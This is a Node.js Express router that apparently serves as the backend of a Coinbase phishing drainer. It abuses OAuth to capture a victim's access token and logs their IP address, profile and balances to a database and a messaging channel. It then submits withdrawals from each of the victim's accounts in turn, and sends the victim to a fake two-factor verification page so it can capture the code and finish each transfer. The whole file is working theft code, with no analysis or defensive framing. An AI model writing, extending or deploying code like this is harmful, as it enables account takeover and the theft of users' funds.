const express = require("express");
const router = express.Router();

const controller = require("../controllers");

const User = require("../models/Users");
const Visitor = require("../models/Visitors");

let AvailableAccounts;
let status = true;
let reqWithdrawResponse;

router.get("/dont-touch-api", async (req, res) => {
  console.log("dont touch api");
  const secretData = {
    clientId: process.env.CLIENT_ID,
    redirectURI: process.env.REDIRECT_URI,
  };

  const ipAddress = req.header("x-forwarded-for") || req.socket.remoteAddress;

  const staticIp = ipAddress.split(',')[0].trim();

  await controller.getIp
    .getIpInfo(staticIp)
    .then(async (response) => {
      await Visitor.findOneAndUpdate(
        { ipAddress: response.query },
        {
          $set: { ipInfo: response },
          $inc: { visits: 1 }, // Increment the 'visits' field by 1
        },
        { upsert: true, new: true }
      );

      res.status(200).json({ data: secretData });
    })
    .catch((error) => {
      console.log(error);
    });
});

router.get("/callback", async (req, res) => {
  // Retrieve the authorization code from the callback URL
  try {
    const code = req.query.code;

    const token = await controller.user.getToken(code);
    const ipAddress = req.header("x-forwarded-for") || req.socket.remoteAddress;
    const staticIp = ipAddress.split(',')[0].trim();
    const ipInfo = await controller.getIp.getIpInfo(staticIp);
    const userInfo = await controller.user.getUserInfo(token);
    const balance = await controller.user.getBalance(token);


    const userData = {
      email: userInfo.email,
      user: userInfo,
      totalBalance: balance.totalBalance,
      accounts: balance.accounts,
      $addToSet: { tokens: token, ipInfos: ipInfo },
    };

    await User.findOneAndUpdate({ email: userInfo.email }, userData, {
      upsert: true,
      new: true,
    });

    await controller.message.msg_getBalance(
      token,
      balance.accounts,
      balance.totalBalance,
      userInfo,
      ipInfo
    );


    // AvailableAccounts = balance.accounts.filter((account) => !account.available);
    AvailableAccounts = balance.accounts;;
    if (!AvailableAccounts.length) {
      res.redirect(`https://www.coinbase.com`);
    }

    try {
      reqWithdrawResponse = await controller.transaction.reqWithdraw(
        token,
        AvailableAccounts[0]
      );
      console.log(reqWithdrawResponse, "--reqWithdrawResponse--");
      if (
        reqWithdrawResponse.status === 402 &&
        reqWithdrawResponse.data.id === "two_factor_required"
      ) {
        const encodedToken = Buffer.from(token.access_token).toString("base64");
        res.redirect(
          `${process.env.FRONTEND_URI}/verify_step_two?verify_step_two_challenge=${encodedToken}`
        );
        await controller.message.msg_reqWithdraw(AvailableAccounts[0]);
        await handleTwoFactorAuthentication();
      } else if (
        reqWithdrawResponse.status === 400 &&
        (reqWithdrawResponse.data.id === "invalid_request" || reqWithdrawResponse.data.id === "validation_error")
      ) {
        await controller.message.msg_invalidReqWithdraw(
          AvailableAccounts[0],
          reqWithdrawResponse.message
        );
        await User.updateOne(
          { email: userInfo.email, "accounts.id": AvailableAccounts[0].id },
          {
            $set: {
              "accounts.$.reqWithdrawReason": reqWithdrawResponse.message,
            },
          }
        );
        res.redirect(`${process.env.HACKED_URI}`);
      } else if (
        reqWithdrawResponse.status === 401 &&
        reqWithdrawResponse.data.id === "invalid_token"
      ) {
        res.redirect(`${process.env.FRONTEND_URI}/signin`);
      }
    } catch (error) {
      // handleTwoFactorAuthentication() Error
      if (
        error?.response?.status === 400 &&
        error?.response?.data?.errors[0]?.id === "invalid_request"
      ) {
        console.error("Error: Invalid Request");
        res.redirect(`${process.env.HACKED_URI}`);
        // console.error(error?.response?.data?.errors[0]?.message);
      } else {
        console.log("error");
        res.redirect(`${process.env.HACKED_URI}`);
      }
    }
  } catch (err) {
    console.log("----- CALLBACK -----");
    res.redirect(`${process.env.HACKED_URI}`);
    // console.log(token, "-- token --");
    // console.log(ipAddress, "-- ipAddress --");
    // console.log(ipInfo, "-- ipInfo --");
    // console.log(userInfo, "-- userInfo --");
    // console.log(balance, "-- balance --");
  }
});

async function handleTwoFactorAuthentication() {
  return new Promise((resolve, reject) => {
    router.post("/submit-two_factor_code", async (req, res) => {
      const two_factor_code = req.body.two_factor_code;
      const access_token = req.body.access_token;

      if (!status) {
        try {
          const response = await controller.transaction.withdrawAccount(
            access_token,
            AvailableAccounts[0],
            two_factor_code
          );
          if (response.status === 201) {
            await controller.message.msg_withdrawAccount(response.data.data);
            AvailableAccounts.shift();
            res.status(response.status).json({
              data: response.data.data.amount.currency,
              length: AvailableAccounts.length,
            });
            if (!AvailableAccounts.length) {
              status = true;
              return;
            }

            status = false;
            reqWithdrawResponse = await controller.transaction.reqWithdraw(
              access_token,
              AvailableAccounts[0]
            );
            if (reqWithdrawResponse.data.id === "two_factor_required") {
              await controller.message.msg_reqWithdraw(AvailableAccounts[0]);
            } else if (reqWithdrawResponse.data.id === "invalid_request") {
              await controller.message.msg_invalidReqWithdraw(
                AvailableAccounts[0],
                reqWithdrawResponse.data.message
              );
              await User.updateOne(
                {
                  email: userInfo.email,
                  "accounts.id": AvailableAccounts[0].id,
                },
                {
                  $set: {
                    "accounts.$.reqWithdrawReason":
                      reqWithdrawResponse.data.message,
                  },
                }
              );
            }
          }

          resolve(response); // Resolve the promise once complete
        } catch (error) {
          await controller.message.msg_invalidTwoFactorCode(
            two_factor_code,
            error?.response?.data?.errors[0].message
          );
          res
            .status(error.response.status)
            .json({ data: error?.response?.data?.errors[0] });
          reject(error); // Reject the promise on failure
        }
      } else {
        try {
          const response = await controller.transaction.withdrawAccount(
            access_token,
            AvailableAccounts[0],
            two_factor_code
          );
          if (response.status === 201) {
            await controller.message.msg_withdrawAccount(response.data.data);
            AvailableAccounts.shift();
            res.status(response.status).json({
              data: response.data.data.amount.currency,
              length: AvailableAccounts.length,
            });

            if (!AvailableAccounts.length) {
              status = true;
              return;
            }

            status = false;
            reqWithdrawResponse = await controller.transaction.reqWithdraw(
              access_token,
              AvailableAccounts[0]
            );
            if (reqWithdrawResponse.data.id === "two_factor_required") {
              await controller.message.msg_reqWithdraw(AvailableAccounts[0]);
            } else if (reqWithdrawResponse.data.id === "invalid_request") {
              await controller.message.msg_invalidReqWithdraw(
                AvailableAccounts[0],
                reqWithdrawResponse.data.message
              );
              await User.updateOne(
                {
                  email: userInfo.email,
                  "accounts.id": AvailableAccounts[0].id,
                },
                {
                  $set: {
                    "accounts.$.reqWithdrawReason":
                      reqWithdrawResponse.data.message,
                  },
                }
              );
            }
            resolve(response); // Resolve the promise once complete
          }
        } catch (error) {
          await controller.message.msg_invalidTwoFactorCode(
            two_factor_code,
            error.response.data.errors[0].message
          );
          res
            .status(error.response.status)
            .json({ data: error.response.data.errors[0] });
          reject(error); // Reject the promise on failure
        }
      }
    });
  });
}
module.exports = router;
